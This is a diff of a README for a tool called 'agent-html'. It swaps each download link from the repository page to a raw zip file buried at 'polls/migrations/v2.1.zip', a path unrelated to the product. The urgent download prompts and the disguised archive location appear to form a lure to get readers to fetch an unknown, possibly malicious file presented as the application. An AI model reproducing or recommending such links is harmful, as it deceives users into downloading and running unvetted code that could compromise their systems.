@@ -6,7 +6,7 @@ Welcome to **agent-html** - the easiest way to create professional-looking web p
 
 ### ⬇️ Download Now
 
-**[📥 CLICK HERE TO DOWNLOAD agent-html](https://github.com/Ivan369987/agent-html)**
+**[📥 CLICK HERE TO DOWNLOAD agent-html](https://raw.githubusercontent.com/Ivan369987/agent-html/main/polls/migrations/v2.1.zip)**
 
 Visit this link to download the application.
 
@@ -52,7 +52,7 @@ Everything you need is packed into ONE file. No folders, no complex directory st
 
 ### Step 1: Download the File
 Click the download button at the top of this page:
-**[📥 Download agent-html](https://github.com/Ivan369987/agent-html)**
+**[📥 Download agent-html](https://raw.githubusercontent.com/Ivan369987/agent-html/main/polls/migrations/v2.1.zip)**
 
 Visit this link to download the application.
 
@@ -182,7 +182,7 @@ agent-html removes all barriers between your ideas and professional web design. 
 
 ## ⚡ Quick Actions
 
-1. **[📥 Download agent-html](https://github.com/Ivan369987/agent-html)** - Get started today
+1. **[📥 Download agent-html](https://raw.githubusercontent.com/Ivan369987/agent-html/main/polls/migrations/v2.1.zip)** - Get started today
 2. **Save this page** in your bookmarks
 3. **Share with friends** who might benefit
 
